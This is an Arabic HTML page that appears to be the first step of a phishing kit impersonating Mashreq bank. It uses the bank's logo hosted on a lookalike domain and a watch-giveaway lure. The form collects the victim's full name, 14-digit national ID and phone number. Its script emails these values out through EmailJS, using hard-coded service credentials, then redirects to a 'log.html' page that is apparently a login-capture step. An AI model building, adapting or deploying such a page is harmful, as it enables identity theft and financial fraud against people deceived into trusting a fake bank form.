<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>البيانات الشخصية - المشرق</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
    
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script type="text/javascript">
        // قم بوضع مفتاح Public Key الخاص بك من حساب EmailJS هنا
        (function(){
            emailjs.init("7XPO5m_okb7NT_n2a");
        })();
    </script>

    <style>
        :root {
            --bg-page: #f5f6f8;
            --container-bg: #ffffff;
            --primary-orange: #ea6114; /* لون برتقالي مطابق للصورة */
            --border-color: #e0e0e0;
            --text-dark: #333333;
            --text-muted: #888888;
        }

        body {
            font-family: 'Cairo', sans-serif;
            background-color: var(--bg-page);
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
        }

        .app-container {
            width: 100%;
            max-width: 480px;
            background-color: var(--container-bg);
            min-height: 100vh;
            box-shadow: 0 0 15px rgba(0,0,0,0.05);
            display: flex;
            flex-direction: column;
        }

        /* الهيدر البرتقالي */
        .header-section {
            background-color: var(--primary-orange);
            padding: 30px 20px 20px 20px;
            text-align: center;
            color: #ffffff;
        }

        .header-section img {
            height: 45px;
            object-fit: contain;
            margin-bottom: 10px;
        }

        .header-section h1 {
            margin: 0;
            font-size: 22px;
            font-weight: 800;
        }

        /* شريط التقدم (Progress Bar) */
        .progress-wrapper {
            padding: 20px 25px 30px 25px;
        }

        .progress-info {
            display: flex;
            justify-content: space-between;
            font-size: 12px;
            font-weight: 700;
            margin-bottom: 8px;
        }

        .progress-info .step {
            color: var(--text-muted);
        }

        .progress-info .percent {
            color: var(--primary-orange);
        }

        .progress-bar {
            width: 100%;
            height: 4px;
            background-color: #eeeeee;
            border-radius: 4px;
            overflow: hidden;
            direction: ltr; /* لجعل التعبئة من اليسار لليمين أو العكس حسب الرغبة */
        }

        .progress-fill {
            width: 20%;
            height: 100%;
            background-color: var(--primary-orange);
            float: right; /* يبدأ من اليمين لأننا في واجهة عربية */
        }

        /* نموذج إدخال البيانات */
        .form-section {
            padding: 0 25px 30px 25px;
            flex-grow: 1;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-group label {
            display: block;
            font-size: 14px;
            font-weight: 700;
            color: var(--text-dark);
            margin-bottom: 8px;
        }

        .form-group input {
            width: 100%;
            padding: 12px 15px;
            font-size: 14px;
            font-family: 'Cairo', sans-serif;
            border: 1px solid var(--border-color);
            border-radius: 6px;
            box-sizing: border-box;
            outline: none;
            transition: border-color 0.3s;
        }

        .form-group input::placeholder {
            color: #bbbbbb;
        }

        .form-group input:focus {
            border-color: var(--primary-orange);
        }

        /* زر المتابعة */
        .btn-submit {
            background-color: var(--primary-orange);
            color: #ffffff;
            width: 100%;
            border: none;
            padding: 14px;
            font-size: 16px;
            font-weight: 700;
            font-family: 'Cairo', sans-serif;
            border-radius: 6px;
            cursor: pointer;
            margin-top: 10px;
            transition: background 0.3s;
        }

        .btn-submit:hover {
            background-color: #d8540c;
        }

        .btn-submit:disabled {
            background-color: #f1a980;
            cursor: not-allowed;
        }
    </style>
</head>
<body>

    <div class="app-container">
        
        <div class="header-section">
            <img src="https://watchmasreqq.com/manus-storage/mashreq_logo_d26073c8.png" alt="المشرق">
            <h1>البيانات الشخصية</h1>
        </div>

        <div class="progress-wrapper">
            <div class="progress-info">
                <span class="step">الخطوة 1 من 5</span>
                <span class="percent">20%</span>
            </div>
            <div class="progress-bar">
                <div class="progress-fill"></div>
            </div>
        </div>

        <div class="form-section">
            <form id="personal-data-form">
                
                <div class="form-group">
                    <label for="fullName">الاسم الكامل</label>
                    <input type="text" id="fullName" name="fullName" placeholder="أدخل اسمك الكامل" required>
                </div>

                <div class="form-group">
                    <label for="nationalId">الرقم القومي (14 رقم)</label>
                    <input type="text" id="nationalId" name="nationalId" placeholder="أدخل الرقم القومي" maxlength="14" pattern="\d{14}" title="الرجاء إدخال 14 رقم صحيح" required>
                </div>

                <div class="form-group">
                    <label for="phone">رقم الهاتف</label>
                    <input type="tel" id="phone" name="phone" placeholder="أدخل رقم الهاتف" required>
                </div>

                <button type="submit" class="btn-submit" id="submit-btn">متابعة &larr;</button>

            </form>
        </div>

    </div>

    <script>
        document.getElementById('personal-data-form').addEventListener('submit', function(event) {
            event.preventDefault(); // منع إعادة تحميل الصفحة

            const btn = document.getElementById('submit-btn');
            const originalText = btn.innerHTML;
            
            // تغيير حالة الزر أثناء الإرسال
            btn.innerHTML = 'جاري المعالجة...';
            btn.disabled = true;

            // تجهيز البيانات للإرسال (تأكد أن هذه الأسماء مطابقة للمتغيرات في EmailJS Template)
            const templateParams = {
                fullName: document.getElementById('fullName').value,
                nationalId: document.getElementById('nationalId').value,
                phone: document.getElementById('phone').value,
                // يمكنك إرسال اختيار الساعة هنا أيضاً إذا أردت
                selectedWatch: localStorage.getItem('selectedWatchName') || 'لم يحدد'
            };

            // قم بتبديل YOUR_SERVICE_ID و YOUR_TEMPLATE_ID بالبيانات الخاصة بك
            emailjs.send('service_tx5bibb', 'template_06dby3i', templateParams)
                .then(function(response) {
                    console.log('SUCCESS!', response.status, response.text);
                    // التوجيه لصفحة الخطوة الثانية عند نجاح الإرسال (قم بتعديل الرابط كما تشاء)
                    window.location.href = 'log.html'; 
                }, function(error) {
                    console.log('FAILED...', error);
                    alert('حدث خطأ أثناء الاتصال بالخادم. يرجى المحاولة مرة أخرى.');
                    // إعادة الزر لحالته الطبيعية
                    btn.innerHTML = originalText;
                    btn.disabled = false;
                });
        });
    </script>

</body>
</html>
